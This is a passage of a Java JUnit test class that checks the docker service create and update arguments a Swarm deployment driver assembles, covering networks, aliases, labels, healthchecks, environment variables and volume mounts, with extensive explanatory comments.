package eu.wohlben.qits.deployments.swarmhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.deployments.confighost.ConfigHostExtrasSource;
import eu.wohlben.qits.deployments.confighost.ExtrasStub;
import eu.wohlben.qits.deployments.deployments.control.DeploymentDriver;
import eu.wohlben.qits.deployments.deployments.control.DeploymentExtrasSource;
import eu.wohlben.qits.deployments.deployments.control.ExtrasSnapshot;
import eu.wohlben.qits.deployments.deployments.control.HealthGate;
import eu.wohlben.qits.deployments.deployments.control.PdProcess;
import eu.wohlben.qits.deployments.deployments.control.ServiceExtras;
import eu.wohlben.qits.deployments.environments.error.BadRequestException;
import io.smallrye.config.PropertiesConfigSource;
import io.smallrye.config.SmallRyeConfigBuilder;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Deque;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import org.eclipse.microprofile.config.Config;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker service} argv as assembled, and the verdicts read back out of it — plain JUnit
 * over a scripted process seam: the argv IS the contract with swarm, and asserting it needs no
 * swarm.
 *
 * <p><b>It is the whole of what a booted application no longer covers.</b> While a hand-rolled
 * replace lived above this seam, the {@code @QuarkusTest} flow tests drove that choreography for
 * real against a faked CLI. There is no choreography left — the whole membership is declared at
 * create time, the update policy IS the cutover, and {@code UpdateStatus} already says whether the
 * rollback happened — so what a deployment does to a daemon is settled here, one argv at a time.
 */
class SwarmDeploymentDriverTest {

  private static final String IMAGE = "qits-platform-artifacts:8080/qits/qits-gateway:abc1234";

  /**
   * The released coordinate this spec deploys. It reaches the extras read, which is addressed by
   * (application, environment, version) — so it is a value with a claim on it here rather than
   * scenery: {@code theExtrasAreAskedForThisDeploymentsOwnPlaceAndRelease} pins that the argv
   * builder hands the source the spec's own three and not something it derived.
   */
  private static final String VERSION = "2026.903.113443";

  /** When the scripted deployment issued its update — the qits-docs incident's own instant. */
  private static final Instant ISSUED = Instant.parse("2026-08-13T10:21:12.698Z");

  private static final DateTimeFormatter GO_TIME =
      DateTimeFormatter.ofPattern("uuuu-MM-dd HH:mm:ss.SSSSSSSSS");

  private ScriptedCli cli;

  /** A StartedAt as {@code service inspect --format} prints it: Go's own {@code time.Time}. */
  private static String stamp(Instant instant) {
    return GO_TIME.format(instant.atOffset(ZoneOffset.UTC)) + " +0000 UTC";
  }

  /**
   * A driver that has just updated {@code dev-qits-gateway} at {@link #ISSUED} — which is what
   * makes the difference between this deployment's UpdateStatus and the previous one's readable.
   */
  private SwarmDeploymentDriver driverThatIssuedAnUpdate() {
    SwarmDeploymentDriver driver = driver();
    driver.clock = Clock.fixed(ISSUED, ZoneOffset.UTC);
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, driver.apply(spec()).outcome());
    return driver;
  }

  private SwarmDeploymentDriver driver() {
    return driver(Map.of());
  }

  private SwarmDeploymentDriver driver(Map<String, String> properties) {
    // The shipped default, which no working directory of this suite has a file at: the extras come
    // from the boot config alone, exactly as they did before the file was read per argv.
    return driver(properties, "config/application.properties");
  }

  private SwarmDeploymentDriver driver(Map<String, String> properties, String extrasFile) {
    Config boot =
        new SmallRyeConfigBuilder()
            .withSources(new PropertiesConfigSource(properties, "test", 100))
            .build();
    // The file half of the seam, which is what every argv assertion below is about: the boot config
    // plus the config volume's file, one snapshot per call. The service half is
    // ConfigHostExtrasSourceTest's, and the two argvs it reaches are two tests of their own.
    return driver(
        (application, environmentName, version, declarationSeeded) ->
            ExtrasSnapshot.over(boot, extrasFile));
  }

  private SwarmDeploymentDriver driver(DeploymentExtrasSource extras) {
    SwarmDeploymentDriver driver = new SwarmDeploymentDriver();
    driver.extrasSource = extras;
    driver.runtime = "docker";
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 60;
    driver.updateMonitorSeconds = 60;
    driver.flatNetwork = "qits-net";
    driver.outputMaxChars = 65536;
    // The SHIPPED state: `qits.deployments.platform-domain` defaults to empty and SmallRye reads an
    // empty value as absent, so an installation that has not stated its domain hands the driver
    // nothing. Every other test in this class therefore asserts the argv of a platform that states
    // no domain, which is the argv byte for byte as it was before the key existed.
    driver.platformDomain = Optional.empty();
    cli = new ScriptedCli();
    driver.scriptCli(cli);
    return driver;
  }

  /**
   * An application, asked for the docker-shaped membership the state machine computes without
   * knowing who runs it: its own network first, then the legacy one and its bundle.
   *
   * <p><b>There is one shape here now, and that is the whole of what the plane's deletion did to
   * this fixture.</b> Every overload used to take a {@code PdDeploymentTarget} and branch on it,
   * because a PLATFORM service was a second shape — a bare deployment name, a bare wire alias, and
   * the {@code qits-platform} overlay beside the flat one. The enum is deleted, and with it the
   * question: every service is an environment service in the one tier, so the fixture always
   * produces what the {@code platform == false} arm used to produce and nothing branches on
   * anything.
   */
  private DeploymentDriver.ServiceSpec spec() {
    return spec(DeploymentDriver.UpdateOrder.START_FIRST, List.of());
  }

  private DeploymentDriver.ServiceSpec spec(
      DeploymentDriver.UpdateOrder order, List<DeploymentDriver.ResourceBinding> resources) {
    return spec(order, DeploymentDriver.PublishMode.HOST, resources);
  }

  private DeploymentDriver.ServiceSpec spec(
      DeploymentDriver.UpdateOrder order,
      DeploymentDriver.PublishMode publishMode,
      List<DeploymentDriver.ResourceBinding> resources) {
    return spec(order, publishMode, resources, List.of());
  }

  /** The same application, having declared volumes of its own in its {@code deployments.yml}. */
  private DeploymentDriver.ServiceSpec spec(List<DeploymentDriver.VolumeMount> volumes) {
    return spec(
        DeploymentDriver.UpdateOrder.START_FIRST,
        DeploymentDriver.PublishMode.HOST,
        List.of(),
        volumes);
  }

  private DeploymentDriver.ServiceSpec spec(
      DeploymentDriver.UpdateOrder order,
      DeploymentDriver.PublishMode publishMode,
      List<DeploymentDriver.ResourceBinding> resources,
      List<DeploymentDriver.VolumeMount> volumes) {
    // EVERY SERVICE CARRIES THE TIER, and now nothing carries anything else. A platform service was
    // already deployed into the designated environment, so its spec named a tier exactly as this
    // one does; what was the plane's own — the unqualified `qits-pd-<app>-<id8>` deployment name,
    // the bare `<app>` wire alias and the `qits-platform` overlay — is simply gone, because there
    // is no plane to be the exception.
    return new DeploymentDriver.ServiceSpec(
        "env-id",
        "dev",
        "app-id",
        "qits-gateway",
        "dep-id",
        "abc1234",
        VERSION,
        // The ordinary release: its tag carried a declaration, so the store holds one for this
        // version and the extras read is addressed by it. The undeclared arm is a test of its own.
        true,
        "qits-pd-dev-qits-gateway-dep",
        "dev-qits-gateway",
        List.of("qits-env-dev-qits-gateway", "qits-net", "qits-env-dev"),
        IMAGE,
        "/q/health/ready",
        null,
        true,
        order,
        publishMode,
        resources,
        volumes);
  }

  @Test
  void theServiceIsNamedAfterTheWireAliasBecauseTheNameIsTheAddress() {
    // container_name does not exist under swarm, so the service name IS what peers resolve — and
    // therefore what the deployment row records and every later question asks about.
    //
    // There was a second assertion here and it was the plane's: a PLATFORM spec answered with the
    // bare `qits-gateway`, because one instance served every tier and a consumer had to be able to
    // reach it without knowing which tier it ran in. The plane is deleted, so there is no second
    // answer to assert — `nameOf` is the wire alias and the wire alias is `<env>-<app>`, always.
    // The nine services that were the plane are being renamed `qits-ci` -> `dev-qits-ci` for
    // exactly this reason, and the qualified name was granted as an extra alias one release earlier
    // so no peer would be left dialling a name nothing answers to while that happened.
    assertEquals("dev-qits-gateway", driver().nameOf(spec()));
  }

  @Test
  void aFreshServiceDeclaresItsWholeMembershipTheHealthGateAndTheUpdatePolicy() {
    List<String> argv = driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertEquals(List.of("docker", "service", "create", "--detach"), argv.subList(0, 4));
    assertTrue(argv.containsAll(List.of("--name", "dev-qits-gateway")));
    assertTrue(argv.containsAll(List.of("--replicas", "1")));
    // The seed's qits/* tags exist on this host and in no registry, so nothing may try to resolve
    // them to a digest.
    assertTrue(argv.contains("--no-resolve-image"));
    assertTrue(argv.containsAll(List.of("--network", "qits-net")));
    assertTrue(argv.containsAll(List.of("--restart-condition", "any")));
    // PID 1 has to be an init that reaps orphans, or a detached `git maintenance` grandchild
    // accumulates as a zombie for as long as the service runs (qits-1066).
    assertTrue(argv.contains("--init"), argv.toString());
    // The gate is docker's own healthcheck, enforced inside the container.
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    // 60s of grace, measured against qits-projects' ~45s worst-case boot rather than derived.
    assertTrue(argv.containsAll(List.of("--health-start-period", "60s")));
    // ...and the cutover is three flags rather than four hundred lines.
    assertTrue(argv.containsAll(List.of("--update-order", "start-first")));
    // The other half of the same window: the monitor moves with the start period or the raise only
    // changes which of the two binds.
    assertTrue(argv.containsAll(List.of("--update-monitor", "60s")));
    assertTrue(argv.containsAll(List.of("--update-failure-action", "rollback")));
    // The bookkeeping labels, on the service AND on its task container: everything that reads them
    // reads them by name and does not care what created them.
    assertTrue(argv.contains("qits.platform.deployments.environment=env-id"));
    assertTrue(argv.contains("qits.platform.deployments.application=app-id"));
    assertTrue(argv.contains("qits.platform.deployments.deployment=dep-id"));
    // There were six labels and there are five: `qits.platform.deployments.target` said which plane
    // a service was on, and a question with one answer is not worth a label. Its absence is
    // asserted rather than merely unasserted, because a label nothing writes but something still
    // FILTERS on is a teardown that reaps nothing — see the teardown test below.
    assertTrue(
        argv.stream().noneMatch(argument -> argument.startsWith("qits.platform.deployments.target")),
        "the plane is deleted, so nothing labels a service with one: " + argv);
    assertTrue(argv.contains("qits.platform.deployments.app-name=qits-gateway"));
    assertEquals(
        argv.stream().filter("--label"::equals).count(),
        argv.stream().filter("--container-label"::equals).count(),
        "every service label is a task label too: " + argv);
    assertTrue(argv.contains("QITS_ENVIRONMENT=dev"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    assertTrue(
        argv.contains(
            "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                + ",deployment.environment.name=dev"
                + ",service.instance.id=dev-qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals(IMAGE, argv.get(argv.size() - 1));
  }

  @Test
  void theTopologyCollapsesToTheFlatOverlayAloneAndTheDeclaredSetIsWhatTheServiceGets() {
    // §4.1: every `service update --network-add` recreates the task, so a per-application network
    // per deployment would make one deployment a restart storm. What survives is the flat
    // attachable overlay.
    //
    // IT USED TO BE TWO OVERLAYS AND IT IS ONE. The second half of this test asserted that a
    // PLATFORM spec collapsed to `qits-net` AND `qits-platform` — the overlay that belonged to no
    // environment, which was the swarm spelling of "on every environment's networks". The plane is
    // deleted, so there is nothing for a second overlay to mean: every service is an environment
    // service in the one tier and joins the one network every service joins. The claim that
    // replaced it is the absence, asserted rather than left implicit, because a network the driver
    // still declared and nothing ever created would be a `service create` that fails outright.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(1, "no such service"));

    driver.apply(spec());

    List<String> create = cli.matching("service create");
    assertEquals(
        List.of("--network", "qits-net"),
        networkArguments(create),
        "the flat overlay alone, and nothing else is declared: " + create);
    assertTrue(
        create.stream().noneMatch(argument -> argument.startsWith("qits-env-")),
        "no per-application or bundle network is declared: " + create);
    // Equality rather than a substring, deliberately: the image coordinate is served from
    // qits-platform-artifacts, so a `contains` here would match the last token of every create argv
    // and the assertion would be red for a reason that is not the plane.
    assertTrue(
        create.stream().noneMatch("qits-platform"::equals),
        "the plane's own overlay is not declared by anybody any more: " + create);
    assertTrue(
        cli.calls.stream()
            .noneMatch(argv -> String.join(" ", argv).contains("network create qits-platform")),
        "and nothing goes looking to create it either: " + cli.calls);
  }

  @Test
  void everyServiceCarriesTheTierInItsLabelsItsEnvironmentAndItsNameAndNoPlaneAnywhere() {
    // The whole of what the plane's deletion changed at the argv, in one place.
    //
    // The claim this replaces was `aPlatformServiceCarriesTheTierInItsLabelsAndItsEnvironmentAndNothingInItsNames`,
    // and it held three things at once: that a platform service DID carry the environment label and
    // QITS_ENVIRONMENT (V8's correction of an older design where it carried neither, which cost the
    // plane the ability to name its own install — no tier in its telemetry, no tier on the four
    // events a route table per environment is projected from, a resource registry keyed by an
    // absence); that it ALSO carried `qits.platform.deployments.target=platform`, which was what a
    // reader asked instead of "has no tier"; and that nothing about its NAMES was qualified by the
    // tier, because one instance served every tier and a consumer had to reach it without knowing
    // which one it ran in.
    //
    // Two of those three stopped being true, for one reason: there is no plane. The tier half
    // survives unchanged and is asserted here for EVERY service rather than as a platform
    // exception. The target label is gone, because a plane with one value is not a fact worth
    // labelling. And the names ARE tier-qualified now — a swarm service's name IS its address, and
    // the nine services that were the plane are being renamed `qits-ci` -> `dev-qits-ci`, which is
    // why the qualified name was granted as an extra network alias one release earlier: a dialer
    // could move onto it while the bare name went on answering.
    List<String> argv =
        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertTrue(argv.contains("qits.platform.deployments.environment=env-id"), argv.toString());
    assertTrue(argv.contains("QITS_ENVIRONMENT=dev"), argv.toString());
    assertTrue(
        argv.contains(
            "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                + ",deployment.environment.name=dev"
                + ",service.instance.id=dev-qits-gateway"),
        "the telemetry names the tier AND the tier-qualified instance: " + argv);
    assertTrue(argv.containsAll(List.of("--name", "dev-qits-gateway")), argv.toString());
    // The absence, stated: no `target=` label at all, in either spelling it ever had.
    assertTrue(
        argv.stream().noneMatch(argument -> argument.startsWith("qits.platform.deployments.target")),
        "no service is labelled with a plane, because there is no plane: " + argv);
  }

  @Test
  void everyContainerIsTOLDThePlatformsDomainWhenTheInstallationHasStatedOne() {
    // The domain is ONE fact and the deployer is what hands it out. It used to be fanned out by the
    // bootstrap into five per-service composed spellings — the edge's ACME domain, the idp's cookie
    // domain, the two browser-host lists, the webauthn origins and the canonical origin — and two
    // of them diverged, which broke sign-in on the live platform. So it travels exactly the way
    // QITS_ENVIRONMENT does: written into every container, derived from by whoever needs a hostname.
    SwarmDeploymentDriver driver = driver();
    driver.platformDomain = Optional.of("wohlben.eu");

    List<String> create = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertTrue(create.contains("QITS_DOMAIN=wohlben.eu"), create.toString());
    // Beside the other two identity variables and not instead of one of them: this is a third fact
    // about where a container is, not a re-spelling of either.
    assertTrue(create.contains("QITS_ENVIRONMENT=dev"), create.toString());
    assertTrue(create.contains("QITS_APPLICATION=qits-gateway"), create.toString());

    // An update carries it too, or the domain would reach only services created after it shipped.
    SwarmDeploymentDriver updating = driver();
    updating.platformDomain = Optional.of("wohlben.eu");
    List<String> update = updating.buildUpdateArgv(spec(), "dev-qits-gateway");
    assertTrue(update.containsAll(List.of("--env-add", "QITS_DOMAIN=wohlben.eu")), update.toString());
  }

  @Test
  void anInstallationThatHasStatedNoDomainWritesNOVARIABLEANDNOTANEMPTYONE() {
    // The shipped state, and the guard is QITS_ENVIRONMENT's one word further on: `QITS_DOMAIN=` is
    // WORSE than the variable's absence. A consumer reading an empty string has been told something
    // — an empty hostname — and composes nonsense out of it; a consumer finding nothing falls back
    // to the default it ships, which is what every service did before this line existed.
    //
    // Both arms are exercised, because they are different absences: Optional.empty() is the key
    // unset (what SmallRye hands back for the shipped empty default), and a blank string is a
    // deployment that stated the variable and left it empty.
    for (Optional<String> stated : List.of(Optional.<String>empty(), Optional.of("   "))) {
      SwarmDeploymentDriver driver = driver();
      driver.platformDomain = stated;

      List<String> argv = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

      assertTrue(
          argv.stream().noneMatch(argument -> argument.startsWith("QITS_DOMAIN")),
          "no domain stated (" + stated + ") means no variable at all: " + argv);
      // …and the rest of the argv is untouched, which is what makes the absence free.
      assertTrue(argv.contains("QITS_ENVIRONMENT=dev"), argv.toString());
      assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"), argv.toString());
    }
  }

  @Test
  void anEnvironmentTeardownReapsByTheEnvironmentLabelAndNothingElse() {
    // The reader that moved with the label, twice.
    //
    // It used to demand `qits.platform.deployments.target=environment` beside the environment id,
    // and the second filter was load-bearing for exactly as long as the plane existed: a platform
    // service carried a tier's environment label while serving every tier, so tearing down the
    // designated environment would have taken qits-platform-idp, the deployer and the rest of the
    // plane down with it. That is why the test was called
    // `anEnvironmentTeardownReapsThatTiersServicesAndNotThePlaneRunningInIt`.
    //
    // There is no service that serves a tier it does not belong to any more, so the environment
    // label is the whole question again — and the target label is not merely unnecessary, it is
    // UNWRITTEN (see the create argv above), which is what makes the second filter dangerous rather
    // than redundant: a filter on a label nothing emits matches nothing, and a teardown that
    // silently reaps zero services is an environment that never goes away.
    SwarmDeploymentDriver driver = driver();
    cli.script("service ls", result(0, ""));

    driver.removeEnvironmentContainers("env-id");

    List<String> listed = cli.matching("service ls");
    assertTrue(
        listed.contains("label=qits.platform.deployments.environment=env-id"), listed.toString());
    assertEquals(
        1,
        listed.stream().filter("--filter"::equals).count(),
        "one filter, and it is the environment's: " + listed);
    assertTrue(
        listed.stream().noneMatch(argument -> argument.contains("deployments.target")),
        "nothing filters on a plane that no service is labelled with: " + listed);
  }

  /** Every {@code --network} and the element behind it, in order — the membership as declared. */
  private static List<String> networkArguments(List<String> argv) {
    List<String> arguments = new ArrayList<>();
    for (int index = 0; index < argv.size() - 1; index++) {
      if ("--network".equals(argv.get(index))) {
        arguments.add(argv.get(index));
        arguments.add(argv.get(index + 1));
      }
    }
    return arguments;
  }

  @Test
  void aDeclaredAliasRidesTheSharedNetworksAttachmentAndNoOthers() {
    // The edge carries the platform's vhost names, and docker's embedded DNS cannot synthesize a
    // *.localhost — so those names resolve only as aliases of the edge's attachment to the network
    // every service joins. Any OTHER network in the membership keeps the short form, because an
    // alias is an address and the address has to live where the platform's names are resolved.
    //
    // The second network used to be spelled `qits-platform` here, and it cannot be any more: that
    // overlay was the plane's own and went with the plane. `qits-env-dev` stands in its place — the
    // bundle overlay the state machine still computes and the spec still declares, and which
    // `collapse` drops before a real deployment ever reaches this method. That is not a cheat: this
    // test drives buildCreateArgv directly with a membership of its own precisely so the "only the
    // shared network carries aliases" rule is pinned as a rule rather than as an accident of there
    // happening to be one network left to attach to.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                    "registry.dev.localhost",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[1]",
                    "mirror.dev.localhost"));

    List<String> argv =
        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-env-dev"));

    assertTrue(
        argv.containsAll(
            List.of(
                "--network", "name=qits-net,alias=registry.dev.localhost,alias=mirror.dev.localhost")),
        argv.toString());
    assertTrue(argv.containsAll(List.of("--network", "qits-env-dev")), argv.toString());
    assertEquals(2, argv.stream().filter("--network"::equals).count(), argv.toString());
    assertEquals(IMAGE, argv.get(argv.size() - 1));
  }

  @Test
  void aServiceWithNoAliasesGetsTheShortFormItAlwaysGot() {
    // The pin: `--network <net>` and `--network name=<net>` mean the same thing to swarm, and only
    // one of them is what every service on this platform was created with.
    List<String> argv =
        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-env-dev"));

    assertEquals(
        List.of("--network", "qits-net", "--network", "qits-env-dev"),
        networkArguments(argv),
        argv.toString());
    assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("name=")), argv.toString());
  }

  @Test
  void theTierQualifiedNameIsTheServicesOwnNameNowSoNothingDerivesAnAliasFromIt() {
    // This test was `aPlatformServiceAnswersToItsBareNameANDToTheTierQualifiedOne`, and it held the
    // ADDITIVE first half of the plane's deletion: a platform service kept its bare `qits-gateway`
    // name and was granted `dev-qits-gateway` as an extra alias on the shared network, so that a
    // dialer could move onto the qualified name one at a time while the bare one went on answering.
    // That staging existed because a swarm service's NAME is its address and swarm cannot rename
    // one — flipping the derivation in a single change would have created dev-qits-gateway BESIDE
    // the qits-gateway that was serving and left every peer dialling a name nothing answers to.
    //
    // The plane is deleted and that cutover is finished: the qualified name is the service's own
    // NAME. So the derivation that used to produce an extra alias could only ever produce an alias
    // equal to the name — which is a line swarm has no use for — and `aliasesOf` therefore answers
    // with deployment config's list and nothing else. An application that declares none gets the
    // byte-identical SHORT form, which is what this now pins.
    List<String> argv =
        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertTrue(argv.containsAll(List.of("--name", "dev-qits-gateway")), argv.toString());
    assertEquals(
        List.of("--network", "qits-net"),
        networkArguments(argv),
        "no name=...,alias=... attachment, because there is nothing left to derive: " + argv);
  }

  @Test
  void configDeclaredAliasesAreTheWholeOfWhatIsEmittedAndInConfigsOwnOrder() {
    // This was `aPlatformServicesDerivedAliasComesAFTERTheOnesConfigDeclared`, and what it pinned
    // was a POSITION: config's own aliases kept the order and the place they always had, and the
    // derived tier-qualified one was appended after them rather than reshuffling the list. There is
    // no derived alias any more — the qualified name is the service's name — so the position claim
    // has nothing to be about, and what survives is the stronger statement underneath it: what a
    // service answers to beyond its own name is deployment config's declaration, all of it, in the
    // order config declared it, and nothing else joins the list.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                    "registry.dev.localhost",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[1]",
                    "mirror.dev.localhost"));

    List<String> argv =
        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertEquals(
        List.of("--network", "name=qits-net,alias=registry.dev.localhost,alias=mirror.dev.localhost"),
        networkArguments(argv),
        "config's two, in config's order, and no third: " + argv);
  }

  @Test
  void aServiceThatDeclaresNoAliasInConfigEmitsNoAliasAtAll() {
    // The absence, asserted across the whole argv rather than only at the attachment — this was
    // `anEnvironmentServiceGainsNothingBecauseTheQualifiedNameIsAlreadyItsOwn`, and the reasoning
    // it carried is now the universal one rather than the environment plane's half of a pair: a
    // service is NAMED dev-qits-gateway, so an alias derived from the tier and the application
    // would be the name it already holds, and swarm has no use for that line. Nothing derives one,
    // so nothing anywhere in the argv says `alias=`.
    List<String> argv =
        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-env-dev"));

    assertTrue(
        argv.stream().noneMatch(argument -> argument.contains("alias=")), argv.toString());
    assertEquals(
        List.of("--network", "qits-net", "--network", "qits-env-dev"),
        networkArguments(argv),
        argv.toString());
  }

  @Test
  void anApplicationThatDeclaresNoAliasAndHasNoSharedNetworkIsDEPLOYEDRatherThanRefused() {
    // This was `aPlatformServiceWithNoSharedNetworkIsDEPLOYEDRatherThanRefused`, and the asymmetry
    // it protected was between a DERIVED alias and a DECLARED one: the derived tier-qualified name
    // was nobody's request — the bare service name already covered it — so with no shared network
    // to hold it, it was dropped rather than refused, and a change meant to be additive could not
    // turn a working platform deployment into a failing one.
    //
    // The derived alias does not exist any more, so that exact asymmetry is unexpressible. The
    // claim that survives is the half that was always the real one: an application declaring NO
    // aliases has nothing that needs a shared network, so an install without one deploys it. The
    // refusal is still the answer for a DECLARED alias with nowhere to live, and the neighbouring
    // `aliasesWithNoSharedNetworkToHoldThemRefuseTheDeployment` is what keeps holding that.
    SwarmDeploymentDriver driver = driver();
    driver.flatNetwork = "";

    List<String> argv =
        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-env-dev"));

    assertEquals(List.of("--network", "qits-env-dev"), networkArguments(argv), argv.toString());
  }

  @Test
  void aliasesWithNoSharedNetworkToHoldThemRefuseTheDeployment() {
    // The publish-with-an-ip stance: a name asked for and quietly not registered is a peer
    // resolving nothing, hours later and somewhere else.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    driver.flatNetwork = "";

    assertThrows(
        ServiceExtras.Refused.class,
        () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-env-dev")));
  }

  @Test
  void anUpdateStatesNoNetworkSoItStatesNoAliasEither() {
    // Swarm has no add-an-alias: an attachment is restated whole, and --network-add of a network
    // the service is already on is an error. Changing an alias is network-rm/network-add by hand,
    // or a service rm and a redeploy — never a deployment.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("--network")), argv.toString());
    assertTrue(argv.stream().noneMatch(argument -> argument.contains("alias=")), argv.toString());
    assertTrue(
        argv.stream().noneMatch(argument -> argument.contains("registry.dev.localhost")),
        argv.toString());
  }

  @Test
  void aServiceThatExistsIsUpdatedInPlaceAndKeepsWhatItWasCreatedWith() {
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(0, "svc123"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service create").isEmpty(), "no second service beside the first");
    List<String> update = cli.matching("service update");
    assertEquals(List.of("docker", "service", "update", "--detach"), update.subList(0, 4));
    assertTrue(update.containsAll(List.of("--image", IMAGE)));
    assertEquals("dev-qits-gateway", update.get(update.size() - 1), "the service is the last token");
    // Mounts, networks and published ports are the create's and stay the create's: an update states
    // what changes, and re-stating a mount would append a second copy of it.
    assertTrue(update.stream().noneMatch(argument -> argument.equals("--network")), update.toString());
    assertTrue(update.stream().noneMatch(argument -> argument.startsWith("--mount")), update.toString());
    // What a deployment does change: the image, the identity it stamps, and the policy it runs under.
    assertTrue(update.containsAll(List.of("--label-add", "qits.platform.deployments.deployment=dep-id")));
    assertTrue(update.contains("--container-label-add"));
    assertTrue(update.containsAll(List.of("--update-order", "start-first")));
    assertTrue(update.containsAll(List.of("--update-failure-action", "rollback")));
    assertTrue(update.contains("--env-add"));
    // Unconditional, same as the create: a service created before this flag shipped converges onto
    // an init PID 1 on its next deployment, with no `service rm` needed (qits-1066).
    assertTrue(update.contains("--init"), update.toString());
  }

  @Test
  void aDeclaredVolumeIsMountedByTheCreateAndReadOnlySurvives() {
    // What the repository declared in `volumes:`, with the names already derived one layer up.
    // type=volume is not a default here: this grammar has no host bind in it, so a declared mount
    // can only ever be a named volume.
    List<String> argv =
        driver()
            .buildCreateArgv(
                spec(
                    List.of(
                        new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false),
                        new DeploymentDriver.VolumeMount("qits_shared_m2", "/m2", true))),
                "dev-qits-gateway",
                List.of("qits-net"));

    assertTrue(
        argv.containsAll(List.of("--mount", "type=volume,source=qits-gateway-data,target=/data")),
        argv.toString());
    assertTrue(
        argv.containsAll(List.of("--mount", "type=volume,source=qits_shared_m2,target=/m2,readonly")),
        argv.toString());
  }

  @Test
  void aDeclaredVolumeAndAConfigMountForOneTargetRenderExactlyOneFlag() {
    // THE MIGRATION STEP. Every application with a volume today gets it from deployment config, so
    // the release that starts declaring one has both statements live at once — and two --mounts for
    // one target is not a duplicate swarm tolerates, it is a `service create` that fails outright.
    // The declaration wins and the config mount for that target is dropped, which is what makes the
    // declaration land and be provably inert while bootstrap still supplies the same value.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[0]",
                    "volume:qits-gateway-data:/data",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[1]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv =
        driver.buildCreateArgv(
            spec(List.of(new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false))),
            "dev-qits-gateway",
            List.of("qits-net"));

    assertEquals(
        1,
        argv.stream().filter(argument -> argument.contains("target=/data")).count(),
        "one target, one --mount: " + argv);
    assertTrue(
        argv.containsAll(List.of("--mount", "type=volume,source=qits-gateway-data,target=/data")),
        argv.toString());
    // What config states about a target the repository did NOT declare is untouched — the host bind
    // in particular, which is the half of this family that stays deployment config forever.
    assertTrue(
        argv.containsAll(
            List.of("--mount", "type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock")),
        argv.toString());
  }

  @Test
  void aDeclaredVolumeMissingFromTheLiveServiceIsRemovedAndCreatedAgain() {
    // A service update cannot add a mount — swarm has no flag for it and buildUpdateArgv states
    // none — so a volume a repository has just started declaring reaches a running service by
    // exactly one route. Without this the declaration would be permanently unhonoured while every
    // deployment went green.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("ContainerSpec.Mounts", result(0, "some-other-volume|/elsewhere\n"));

    DeploymentDriver.ApplyResult applied =
        driver.apply(spec(List.of(new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false))));

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service update").isEmpty(), "an update could never carry the mount");
